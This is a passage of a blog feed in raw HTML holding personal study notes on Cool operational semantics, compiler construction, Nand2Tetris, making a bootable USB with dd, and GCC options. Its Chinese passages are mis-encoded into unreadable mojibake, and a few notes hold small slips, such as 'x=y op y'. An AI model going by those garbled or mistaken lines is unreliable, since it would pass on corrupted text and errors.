id="13-Operational-Semantics"><a href="#13-Operational-Semantics" class="headerlink" title="13 Operational Semantics"></a>13 Operational Semantics</h1><p>The context has three components:<br>    - an environment<br>    - a store<br>    - a self object</p><h2 id="13-1-Environment-and-the-Store"><a href="#13-1-Environment-and-the-Store" class="headerlink" title="13.1 Environment and the Store"></a>13.1 Environment and the Store</h2><p>An environment is a mapping of variable identifiers to locations.</p><p>To describe the environment:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">E</span> = [a:l1,b:l2]<br></code></pre></td></tr></table></figure><p>This environment maps a to location l1, and b to location l2.</p><p>The store(memory) maps location to values. Intuitively, a store tells us what value is stored in a given memory location.</p><p>A store is similar to an environment:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">S = [<span class="hljs-function"><span class="hljs-title">l1</span> -&gt;</span> <span class="hljs-number">55</span>, <span class="hljs-function"><span class="hljs-title">l2</span> -&gt;</span> <span class="hljs-number">77</span>]<br></code></pre></td></tr></table></figure><h2 id="13-2-Syntax-for-Cool-Objects"><a href="#13-2-Syntax-for-Cool-Objects" class="headerlink" title="13.2 Syntax for Cool Objects"></a>13.2 Syntax for Cool Objects</h2><p>Every Cool value is an object.</p><h2 id="13-3-Class-definitions"><a href="#13-3-Class-definitions" class="headerlink" title="13.3 Class definitions"></a>13.3 Class definitions</h2><p>Two mappings, called class and implementation, are associated with class definitions.</p><p>The default initializing for a variable or attribute is the default of its type.</p>]]></content>
    
    
    <categories>
      
      <category>Cool</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Compilers Priciples, Techniques, &amp; Tools Notes</title>
    <link href="/2022/07/28/Compilers-Priciples-Techniques-Tools-Notes/"/>
    <url>/2022/07/28/Compilers-Priciples-Techniques-Tools-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-Introduction"><a href="#Chapter-1-Introduction" class="headerlink" title="Chapter 1 Introduction"></a>Chapter 1 Introduction</h1><h2 id="1-1-Language-Processors"><a href="#1-1-Language-Processors" class="headerlink" title="1.1 Language Processors"></a>1.1 Language Processors</h2><h3 id="1-1-1-Exercises-for-Section-1-1"><a href="#1-1-1-Exercises-for-Section-1-1" class="headerlink" title="1.1.1 Exercises for Section 1.1"></a>1.1.1 Exercises for Section 1.1</h3><p>ç¼–è¯‘å™¨å’Œè§£é‡Šå™¨çš„åŒºåˆ«:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang">ç¼–è¯‘å™¨å·¥ä½œæ—¶ï¼Œè¿”å›ä½çº§çš„ä»£ç ï¼Œå¦‚machine language.<br><br>è§£é‡Šå™¨å·¥ä½œæ—¶ï¼Œäº§ç”Ÿæœºå™¨ç äº¤ç»™ç¡¬ä»¶ç›´æ¥æ‰§è¡Œï¼Œç„¶åè¿”å›ç»“æœ.<br></code></pre></td></tr></table></figure><h2 id="1-2-The-Structure-of-a-Compiler"><a href="#1-2-The-Structure-of-a-Compiler" class="headerlink" title="1.2 The Structure of a Compiler"></a>1.2 The Structure of a Compiler</h2><p>Two parts to this mapping: analysis and synthesis. </p><p>The analysis part also collects information about the source program and stores it in a data structure called a <code>symbol table</code>.</p><p>The analysis part is often called the front end of the compiler, the synthesis part is the back end.</p><p>The analysis part <mark>breaks up</mark> the source program into constituent pieces and imposes a grammatical structure on them.</p><p>The synthesis part <mark>constructs</mark> the desired target program.</p><h3 id="1-2-1-Lexical-Analysis"><a href="#1-2-1-Lexical-Analysis" class="headerlink" title="1.2.1 Lexical Analysis"></a>1.2.1 Lexical Analysis</h3><p>For each lexeme, the lexical analyzer produces as output a token of the form:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;token-<span class="hljs-type">name</span>, <span class="hljs-keyword">attribute</span>-<span class="hljs-keyword">value</span>&gt;<br></code></pre></td></tr></table></figure><p>Lexical analysis divides program text into â€œwordsâ€ or â€œtokensâ€.</p><h3 id="1-2-2-Syntax-Analysis"><a href="#1-2-2-Syntax-Analysis" class="headerlink" title="1.2.2 Syntax Analysis"></a>1.2.2 Syntax Analysis</h3><p>A typical representation is a <mark>syntax tree</mark> in which each interior node represents an operation and the children of the node represent the arguments of the operation.</p><p>The tree shows the order in which the operations in the assignment.</p><h3 id="1-2-3-Semantic-Analysis"><a href="#1-2-3-Semantic-Analysis" class="headerlink" title="1.2.3 Semantic Analysis"></a>1.2.3 Semantic Analysis</h3><p>An important part of semantic snalysis is type checking, where the compiler checks that each operator has matching operands.</p><p>The operator inttofloat, which explicity converts its integer argument into a floating-point number.</p><h3 id="1-2-4-Intermediate-Code-Generation"><a href="#1-2-4-Intermediate-Code-Generation" class="headerlink" title="1.2.4 Intermediate Code Generation"></a>1.2.4 Intermediate Code Generation</h3><p>Syntax trees are a form of intermediate representation.</p><p>The intermediate representation should have two important properties:</p><pre><code class="hljs">- it should be easy to produce- it should be easy to translate into the target machine</code></pre><h3 id="1-2-5-Code-Optimization"><a href="#1-2-5-Code-Optimization" class="headerlink" title="1.2.5 Code Optimization"></a>1.2.5 Code Optimization</h3><p>To improve the intermediate code so that better target code will result.</p><h3 id="1-2-6-Code-Generation"><a href="#1-2-6-Code-Generation" class="headerlink" title="1.2.6 Code Generation"></a>1.2.6 Code Generation</h3><p>The code generator takes as input an intermediate representation of the source program and maps it into the target language.</p><p>The <code>F</code> in each instruction tells us that it deals with floating-point numbers.</p><h3 id="1-2-7-Symbol-Table-Management"><a href="#1-2-7-Symbol-Table-Management" class="headerlink" title="1.2.7 Symbol-Table Management"></a>1.2.7 Symbol-Table Management</h3><p>An essential function of a compiler is to record the variable names used in the source program and collect information about the storage allocated for a name.</p><p>The symbol table is a data structure containing a record for each variable name, with field for the attributes of the name.</p><h3 id="1-2-8-The-Grouping-of-Phases-into-Passes"><a href="#1-2-8-The-Grouping-of-Phases-into-Passes" class="headerlink" title="1.2.8 The Grouping of Phases into Passes"></a>1.2.8 The Grouping of Phases into Passes</h3><h3 id="1-2-9-Compiler-Construction-Tools"><a href="#1-2-9-Compiler-Construction-Tools" class="headerlink" title="1.2.9 Compiler-Construction Tools"></a>1.2.9 Compiler-Construction Tools</h3><h2 id="1-3-The-Evolution-of-Programming-Languages"><a href="#1-3-The-Evolution-of-Programming-Languages" class="headerlink" title="1.3 The Evolution of Programming Languages"></a>1.3 The Evolution of Programming Languages</h2><h3 id="1-3-1-The-Move-to-Higher-level-Language"><a href="#1-3-1-The-Move-to-Higher-level-Language" class="headerlink" title="1.3.1 The Move to Higher-level Language"></a>1.3.1 The Move to Higher-level Language</h3><p>Initially, The instructions in an assembly language were just mnemonic representations of machine instructions. Later, macro instructions were added to assembly languages.</p><p>First-generation languages are the machine languages.</p><p>Second-generation the assembly languages.</p><p>Third-generation the higher-level languages.</p><p>Fourth-generation are languages designed for special application.</p><h3 id="1-3-2-Impact-on-Compilers"><a href="#1-3-2-Impact-on-Compilers" class="headerlink" title="1.3.2 Impact on Compilers"></a>1.3.2 Impact on Compilers</h3><h2 id="1-4-The-Science-of-Building-a-Compiler"><a href="#1-4-The-Science-of-Building-a-Compiler" class="headerlink" title="1.4 The Science of Building a Compiler"></a>1.4 The Science of Building a Compiler</h2><h3 id="1-4-2-The-Science-of-Code-Optimization"><a href="#1-4-2-The-Science-of-Code-Optimization" class="headerlink" title="1.4.2 The Science of Code Optimization"></a>1.4.2 The Science of Code Optimization</h3><h2 id="1-5-Applications-of-Compiler-Technology"><a href="#1-5-Applications-of-Compiler-Technology" class="headerlink" title="1.5 Applications of Compiler Technology"></a>1.5 Applications of Compiler Technology</h2><h3 id="1-5-1-Implementation-of-High-Level-Programming-Languages"><a href="#1-5-1-Implementation-of-High-Level-Programming-Languages" class="headerlink" title="1.5.1 Implementation of High-Level Programming Languages"></a>1.5.1 Implementation of High-Level Programming Languages</h3><p>Optimizing compilers include techniques to improve the performance of generated code, thus offsetting the inefficiency introduced by high-level abstractions.</p><p>The key ideas behind object orientation are:</p><pre><code class="hljs">1. Data abstraction2. Inheritance of properties</code></pre><p>Java has a built-in garbage-collection facility that automatically frees the memory of variable that are no longer in use.</p><h3 id="1-5-2-Optimizations-for-Computer-Architectures"><a href="#1-5-2-Optimizations-for-Computer-Architectures" class="headerlink" title="1.5.2 Optimizations for Computer Architectures"></a>1.5.2 Optimizations for Computer Architectures</h3><p>Two basic techniques:</p><pre><code class="hljs">- parallelism- memory hierarchies</code></pre><h3 id="1-5-4-Program-Translations"><a href="#1-5-4-Program-Translations" class="headerlink" title="1.5.4 Program Translations"></a>1.5.4 Program Translations</h3><h3 id="1-5-5-Software-Productivity-Tools"><a href="#1-5-5-Software-Productivity-Tools" class="headerlink" title="1.5.5 Software Productivity Tools"></a>1.5.5 Software Productivity Tools</h3><h2 id="1-6-Programming-Language-Basics"><a href="#1-6-Programming-Language-Basics" class="headerlink" title="1.6 Programming Language Basics"></a>1.6 Programming Language Basics</h2><h3 id="1-6-1-The-Static-x2F-Dynamic-Distinction"><a href="#1-6-1-The-Static-x2F-Dynamic-Distinction" class="headerlink" title="1.6.1 The Static&#x2F;Dynamic Distinction"></a>1.6.1 The Static&#x2F;Dynamic Distinction</h3><p>If a language uses a policy that allow the compiler to decide an issue, then we say that the language uses a <mark>static</mark> policy or that the issue can be decided at compile time. æ„æ€æ˜¯éœ€è¦æ‰‹åŠ¨è®¾ç½®å—ã€‚</p><p>The scope of declarations. A language uses static scope or lexical scope if it is possible to determine the scope of a declaration by looking only at the program.</p><p>Otherwise, the language uses dynamic scope.</p><p>The compiler to determine the location in memory where the declared variable can be found.</p><h3 id="1-6-2-Environments-and-States"><a href="#1-6-2-Environments-and-States" class="headerlink" title="1.6.2 Environments and States"></a>1.6.2 Environments and States</h3><p>The association of names with locations in memory and then with values can be described by two mappings that change as the program runs. </p><p>The <mark>environment</mark> is a mapping from names to locations in the store.</p><p>The <mark>state</mark> is a mapping from locations in store to their values.</p><h3 id="1-6-4-Explicit-Access-Control"><a href="#1-6-4-Explicit-Access-Control" class="headerlink" title="1.6.4 Explicit Access Control"></a>1.6.4 Explicit Access Control</h3><p>Classes and structures introduce a new scope for their members.</p><h4 id="Declarations-and-Definitions"><a href="#Declarations-and-Definitions" class="headerlink" title="Declarations and Definitions"></a>Declarations and Definitions</h4><p>Declarations tell us about the types of things, while definitions tell us about their values.</p><h3 id="1-6-6-Parameter-Passing-Mechanisms"><a href="#1-6-6-Parameter-Passing-Mechanisms" class="headerlink" title="1.6.6 Parameter Passing Mechanisms"></a>1.6.6 Parameter Passing Mechanisms</h3><p>The strict call-by-value requires that the caller copy the entire actual parameter into the soace belonging to the corresponding formal parameter.</p><h1 id="Chapter-2-A-Simple-Symtax-Directed-Translator"><a href="#Chapter-2-A-Simple-Symtax-Directed-Translator" class="headerlink" title="Chapter 2 A Simple Symtax-Directed Translator"></a>Chapter 2 A Simple Symtax-Directed Translator</h1><h2 id="2-1-Introduction"><a href="#2-1-Introduction" class="headerlink" title="2.1 Introduction"></a>2.1 Introduction</h2><p>A notation in which operators appear after their operands.</p><p>Two forms of intermediate code are:<br>    - abstract syntax trees<br>    - simply syntax trees<br>represents the hierarchical syntactic structure of the source program.</p><p><mark>Three-address code</mark><br>The form:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">x</span><span class="hljs-operator">=</span>y op y<br></code></pre></td></tr></table></figure><p><code>op</code> is a binary operator, y and z are addressed for operands, and x is the address for the result of the operation.</p><h2 id="2-2-Syntax-Definition"><a href="#2-2-Syntax-Definition" class="headerlink" title="2.2 Syntax Definition"></a>2.2 Syntax Definition</h2><p>A grammar naturally describes the hierarchical structure of most programming language constructs.</p><p>Such a rule is called a <mark>production</mark>. In a production, lexical elements like the keyword <code>if</code> and the parentheses are called <mark>terminals</mark>. Variable like <code>expr</code> and <code>stmt</code> represent sequences of terminals and are called <mark>nonterminals</mark>.</p><h3 id="2-2-3-Parse-Trees"><a href="#2-2-3-Parse-Trees" class="headerlink" title="2.2.3 Parse Trees"></a>2.2.3 Parse Trees</h3><p>A <mark>parse tree</mark> pictorially shows how the start symble of a grammar derives a string in the language.</p>]]></content>
    
    
    <categories>
      
      <category>Compiler Theory</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>The Elements of Computing System Notes</title>
    <link href="/2022/07/26/The-Elements-of-Computing-System-Notes/"/>
    <url>/2022/07/26/The-Elements-of-Computing-System-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Hardware"><a href="#Hardware" class="headerlink" title="Hardware"></a>Hardware</h1><h2 id="Hello-World-Below"><a href="#Hello-World-Below" class="headerlink" title="Hello, World Below"></a>Hello, World Below</h2><h2 id="Nand-to-Tetris"><a href="#Nand-to-Tetris" class="headerlink" title="Nand to Tetris"></a>Nand to Tetris</h2><h2 id="Abstraction-and-Implementation"><a href="#Abstraction-and-Implementation" class="headerlink" title="Abstraction and Implementation"></a>Abstraction and Implementation</h2><p>Abstraction describes what the module does, and implementation describes how it does it.</p><p>The RAM contains billions of registers, yet any of them can be accessed directly.</p><p>The RAM storage and direct-access capabilities will be relized using registers and multiplexers.</p><h2 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h2><h2 id="The-Road-Ahead"><a href="#The-Road-Ahead" class="headerlink" title="The Road Ahead"></a>The Road Ahead</h2><h1 id="1-Boolean-Logic"><a href="#1-Boolean-Logic" class="headerlink" title="1 Boolean Logic"></a>1 Boolean Logic</h1><p>Elementary logic gates.</p><p>Nand, Not, And, Or, and Xor.</p><p>Multiplexer and Demultiplexer.</p><h2 id="1-1-Boolean-Algebra"><a href="#1-1-Boolean-Algebra" class="headerlink" title="1.1 Boolean Algebra"></a>1.1 Boolean Algebra</h2><p>A Boolean function is a function that operates on binary inputs and returns binary outputs.</p><p>The name of the Nand operator is shorthand for Not-And.</p><p>The Xor operatorâ€“shorthand for exclusive or.</p><p>The Nor gate derives its name from Not-Or.</p><p>Any Boolean function can be realized using Nand gates only.</p><h3 id="Truth-Tables-and-Boolean-Expressions"><a href="#Truth-Tables-and-Boolean-Expressions" class="headerlink" title="Truth Tables and Boolean Expressions"></a>Truth Tables and Boolean Expressions</h3><p>A turth table is often a convenient means for describing some states of nature.</p><p>The ability to simplify a Boolean expression is the first step toward hardware optimization.</p><h2 id="1-2-Logic-Gates"><a href="#1-2-Logic-Gates" class="headerlink" title="1.2 Logic Gates"></a>1.2 Logic Gates</h2><p>Computer scientist don not have to worry about physical artifacts.</p><h3 id="Primitive-and-Composite-Gates"><a href="#Primitive-and-Composite-Gates" class="headerlink" title="Primitive and Composite Gates"></a>Primitive and Composite Gates</h3><p>Any given logic gate can be viewed from two different perspectives:</p><pre><code class="hljs">- internal- external</code></pre><h2 id="1-3-Hardware-Construction"><a href="#1-3-Hardware-Construction" class="headerlink" title="1.3 Hardware Construction"></a>1.3 Hardware Construction</h2><h3 id="1-3-1-Hardware-Description-Language"><a href="#1-3-1-Hardware-Description-Language" class="headerlink" title="1.3.1 Hardware Description Language"></a>1.3.1 Hardware Description Language</h3><p>p42</p>]]></content>
    
    
    <categories>
      
      <category>Compiler Theory</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Using dd command</title>
    <link href="/2022/07/24/Using-dd-command/"/>
    <url>/2022/07/24/Using-dd-command/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/xiao_yi_xiao/article/details/119325002">rference</a></p><h1 id="é¦–å…ˆæŸ¥æ‰¾-U-ç›˜è®¾å¤‡"><a href="#é¦–å…ˆæŸ¥æ‰¾-U-ç›˜è®¾å¤‡" class="headerlink" title="é¦–å…ˆæŸ¥æ‰¾ U ç›˜è®¾å¤‡"></a>é¦–å…ˆæŸ¥æ‰¾ U ç›˜è®¾å¤‡</h1><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo fdisk -l<br></code></pre></td></tr></table></figure><h1 id="å¸è½½-U-ç›˜"><a href="#å¸è½½-U-ç›˜" class="headerlink" title="å¸è½½ U ç›˜"></a>å¸è½½ U ç›˜</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo umount <span class="hljs-regexp">/dev/</span>sda1<br></code></pre></td></tr></table></figure><h1 id="ä½¿ç”¨-dd-å‘½ä»¤åˆ¶ä½œå¯åŠ¨ç›˜"><a href="#ä½¿ç”¨-dd-å‘½ä»¤åˆ¶ä½œå¯åŠ¨ç›˜" class="headerlink" title="ä½¿ç”¨ dd å‘½ä»¤åˆ¶ä½œå¯åŠ¨ç›˜"></a>ä½¿ç”¨ dd å‘½ä»¤åˆ¶ä½œå¯åŠ¨ç›˜</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo dd <span class="hljs-attribute">if</span>=xxx.iso <span class="hljs-attribute">of</span>=Uç›˜è·¯å¾„ <span class="hljs-attribute">status</span>=progress<br></code></pre></td></tr></table></figure><p>æ³¨æ„ä¸è¦å¡«ä¸Šæ•°å­—ï¼Œè¦å†™æˆå¦‚: <code>/dev/sda</code>.</p><p>è¿™é‡Œ <code>status=LEVEL</code>, æ˜¯å’ŒæŠ¥é”™ç›¸å…³.</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>An Introduction to GCC Notes</title>
    <link href="/2022/07/23/An-Introduction-to-GCC-Notes/"/>
    <url>/2022/07/23/An-Introduction-to-GCC-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-Introduction"><a href="#Chapter-1-Introduction" class="headerlink" title="Chapter 1: Introduction"></a>Chapter 1: Introduction</h1><h1 id="Chapter-2-Compiling-a-C-program"><a href="#Chapter-2-Compiling-a-C-program" class="headerlink" title="Chapter 2: Compiling a C program"></a>Chapter 2: Compiling a C program</h1><p>The <code>-o</code> option is usually given as the last argument on the command line.</p><p>If the <code>-o</code> option is omitted, the output is written to a default file called â€˜a.outâ€™.</p><p>Always using <code>-Wall</code> option.</p><p>The messages produced by GCC always have th  form:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>:<span class="hljs-built_in">line</span>-<span class="hljs-built_in">number</span>:message<br></code></pre></td></tr></table></figure><p>The linker fills in these missing addresses when it produces the executable.</p><h3 id="2-4-1-Creating-object-file-from-source-files"><a href="#2-4-1-Creating-object-file-from-source-files" class="headerlink" title="2.4.1 Creating object file from source files"></a>2.4.1 Creating object file from source files</h3><p>The command-line option <code>-c</code> is used to compile a source file to an object file.</p><h3 id="2-4-2-Creating-executables-from-object-files"><a href="#2-4-2-Creating-executables-from-object-files" class="headerlink" title="2.4.2 Creating executables from object files"></a>2.4.2 Creating executables from object files</h3><p>Use gcc to link the object files together and fill in the missing addresse of external functions.</p><p>A separate program, linker ld.</p><h3 id="2-4-3-Link-order-of-object-files"><a href="#2-4-3-Link-order-of-object-files" class="headerlink" title="2.4.3 Link order of object files"></a>2.4.3 Link order of object files</h3><p>The object file which contains the definition of a function should appear after any files which call that function.</p><h2 id="2-5-Recompiling-and-relinking"><a href="#2-5-Recompiling-and-relinking" class="headerlink" title="2.5 Recompiling and relinking"></a>2.5 Recompiling and relinking</h2><p>Linking is faster than compilation.</p><h2 id="2-6-Linking-with-external-libraries"><a href="#2-6-Linking-with-external-libraries" class="headerlink" title="2.6 Linking with external libraries"></a>2.6 Linking with external libraries</h2><p>A library is a collection of precompiled object files which can be linked into programs.</p><p>Libraries are typically stored in special archive files with the extension <code>.a</code>, refferred to as static libraries.</p><p>They are created from object files with a saparate tool, <mark>the GNU archiver ar</mark>, and used by the linker to resolve references to functions at compile-time.</p><p>The standard system libraries are usually found in the directories <code>/usr/lib</code> and <code>/lib</code>.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ gcc -Wall calc.c <span class="hljs-regexp">/usr/</span>lib/libm.a -o calc<br></code></pre></td></tr></table></figure><p>The library <code>libm.a</code> contains object files for all the mathematical functions.</p><p>ä½¿ç”¨ç¼©å†™, the compiler option <code>-lNAME</code> will attempt to link object files with a library file <code>libNAME.a</code> in the standard library directories.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>gcc -Wall calc.c -lm -o calc<br></code></pre></td></tr></table></figure><h3 id="2-6-1-Link-order-of-libraries"><a href="#2-6-1-Link-order-of-libraries" class="headerlink" title="2.6.1 Link order of libraries"></a>2.6.1 Link order of libraries</h3><p>Searching from left to right. å·¦è¾¹ç¼ºå°‘çš„åˆ°å³è¾¹æ‰¾ã€‚</p><h2 id="2-7-Using-library-header-files"><a href="#2-7-Using-library-header-files" class="headerlink" title="2.7 Using library header files"></a>2.7 Using library header files</h2><p>In order to declare function arguments and return values with the correct types. æ²¡æœ‰å£°æ˜ï¼Œå‚æ•°çš„ç±»å‹ä¼šå‡ºé”™ã€‚</p><h1 id="Chapter-3-Compilation-options"><a href="#Chapter-3-Compilation-options" class="headerlink" title="Chapter 3: Compilation options"></a>Chapter 3: Compilation options</h1><p>By default, gcc searches the following directories for header files:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/usr/</span>local/<span class="hljs-keyword">include</span><br><span class="hljs-regexp">/usr/i</span>nclude<br></code></pre></td></tr></table></figure><p>For libraries:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local/lib<br><span class="hljs-regexp">/usr/</span>lib<br></code></pre></td></tr></table></figure><p>Local çš„ä¼˜å…ˆçº§æ›´é«˜ã€‚</p><p>You should never place the absolute paths of header files in <code>#include</code> statement.</p><p><code>-I</code> option or <code>INCLUDE_PATH</code> variable. å¯æŒ‡å®šé¢å¤–çš„<code>#include</code> è·¯å¾„ã€‚</p><p><code>-L</code> option or <code>LIBRARY_PATH</code> variable. å¯æŒ‡å®šé¢å¤–çš„ link path.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ gcc -Wall -I<span class="hljs-regexp">/opt/g</span>dbm-<span class="hljs-number">1.8</span>.<span class="hljs-number">3</span><span class="hljs-regexp">/include -L/</span>opt<span class="hljs-regexp">/gdbm-1.8.3/</span>lib demain.c -lgdbm<br></code></pre></td></tr></table></figure><p>è‹¥è®¾ç½®äº†<code>C_INCLUDE_PATH</code> æˆ– <code>CPLUS_INCLUDE_PATH</code> æˆ– <code>LIBRARY_PATH</code> å°±ä¸ç”¨ä½¿ç”¨<code>-I</code>å’Œ<code>-L</code>é€‰é¡¹ã€‚</p><h3 id="3-1-3-Extended-search-paths"><a href="#3-1-3-Extended-search-paths" class="headerlink" title="3.1.3 Extended search paths"></a>3.1.3 Extended search paths</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">DIR1<span class="hljs-selector-pseudo">:DIR</span>2<span class="hljs-selector-pseudo">:DIR</span>3:...<br></code></pre></td></tr></table></figure><p>or</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">$ gcc -I. -I/<span class="hljs-meta">opt</span>/<span class="hljs-meta">include</span><br></code></pre></td></tr></table></figure><p>å¤šæ¬¡ä½¿ç”¨<code>-I</code> or <code>-L</code>.</p><p>æŸ¥æ‰¾é¡ºåº:</p><pre><code class="hljs">1. command-line option `-I` and `-L`, from left to right2. directories specified by environment variables, such as C_INLUDE_PATH and LIBRARY_PATH3. default system directories</code></pre><h2 id="3-2-Shared-libraries-and-static-libraries"><a href="#3-2-Shared-libraries-and-static-libraries" class="headerlink" title="3.2 Shared libraries and static libraries"></a>3.2 Shared libraries and static libraries</h2><p>External libraries are usually provided in two forms:</p><pre><code class="hljs">1. static libraries, &#39;.a&#39; file2. shared libries, &#39;.so&#39; file</code></pre><p>Dynamic linking makes executable files smaller and saves disk space.</p><p>shared libraries æ¯” static library æ›´å¥½ã€‚</p><p>Shared object file is used in preference to the static library.</p><p>static library åŒ…å«æ‰€æœ‰çš„functionçš„machine code, è€Œ shared object file åªåŒ…å«ä¸€éƒ¨åˆ†ã€‚</p><p>By default, the loader searches for shared libraries only in a predefined set of system deirectories.</p><p>Setting load path: use variable <code>LD_LIBRARY_PATH</code></p><p>Adding new:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">LD_LIBRARY_PATH=/opt/gdbm-1.8.3/lib:<span class="hljs-variable">$LD_LIBRARY_PATH</span></span><br></code></pre></td></tr></table></figure><p>Option <code>-static</code> to avoid using shared library.</p><h2 id="3-3-C-language-standards"><a href="#3-3-C-language-standards" class="headerlink" title="3.3 C language standards"></a>3.3 C language standards</h2><p>Controling the dialect of C, use <code>-ansi</code> and <code>-pedantic</code>.</p><p>é’ˆå¯¹ä¸Cç‰ˆæœ¬ä¹‹é—´çš„å·®å¼‚ã€‚</p><h3 id="3-3-1-ANSI-x2F-ISO"><a href="#3-3-1-ANSI-x2F-ISO" class="headerlink" title="3.3.1 ANSI&#x2F;ISO"></a>3.3.1 ANSI&#x2F;ISO</h3><p>A valid ANSI&#x2F;ISO program may be incompatible with the extention in GNU C.</p><p><code>_GNU_SOURCE</code>, which enable extensions in the GNU C library.</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> gcc -Wall -ansi -D_GNU_SOURCE <span class="hljs-built_in">pi</span>.c<br></code></pre></td></tr></table></figure><h3 id="3-3-3-Selecting-special-standards"><a href="#3-3-3-Selecting-special-standards" class="headerlink" title="3.3.3 Selecting special standards"></a>3.3.3 Selecting special standards</h3><p>The special language standard used by GCC can be controled with the â€˜-stdâ€™ option.</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">-std</span>=c99<br></code></pre></td></tr></table></figure><h2 id="3-4-Warning-options-in-Wall"><a href="#3-4-Warning-options-in-Wall" class="headerlink" title="3.4 Warning options in -Wall"></a>3.4 Warning options in -Wall</h2><p>Warning options can also be selected individually. å¦‚:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-Wcomment</span><br><br><span class="hljs-deletion">-Wformat</span><br><br>...<br></code></pre></td></tr></table></figure><h2 id="3-5-Additional-warning-options"><a href="#3-5-Additional-warning-options" class="headerlink" title="3.5 Additional warning options"></a>3.5 Additional warning options</h2><p><code>-W</code> a general option similar to <code>-Wall</code>.</p><h1 id="4-Using-the-preprocessor"><a href="#4-Using-the-preprocessor" class="headerlink" title="4 Using the preprocessor"></a>4 Using the preprocessor</h1><p>The GNU C preprocessor cpp.</p><p>It expands macros in source files before they are compiled.</p><h2 id="4-1-Defining-macro"><a href="#4-1-Defining-macro" class="headerlink" title="4.1 Defining macro"></a>4.1 Defining macro</h2><p>The gcc option <code>-DNAME</code> defines a preprocessor macro NAME from the command line.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>gcc -Wall -DTEST dtest.c<br></code></pre></td></tr></table></figure><p>gcc è‡ªåŠ¨å®šä¹‰çš„ macro, with a double-underscore prefix <code>__</code>:</p><p>æŸ¥çœ‹:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ cpp -dM <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><h2 id="4-2-Macro-with-values"><a href="#4-2-Macro-with-values" class="headerlink" title="4.2 Macro with values"></a>4.2 Macro with values</h2><p><code>-DNAME=VALUE</code>:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ gcc -Wall <span class="hljs-attribute">-DNUM</span>=100 dtestval.c<br></code></pre></td></tr></table></figure><p>It is a good idea to surround macros by parenthesses.</p><p>When a macro is defined with <code>-D</code> alone, gcc used a default value of 1.</p><p>Empty value:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">-DNAME</span>=<span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>Define a macro message:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 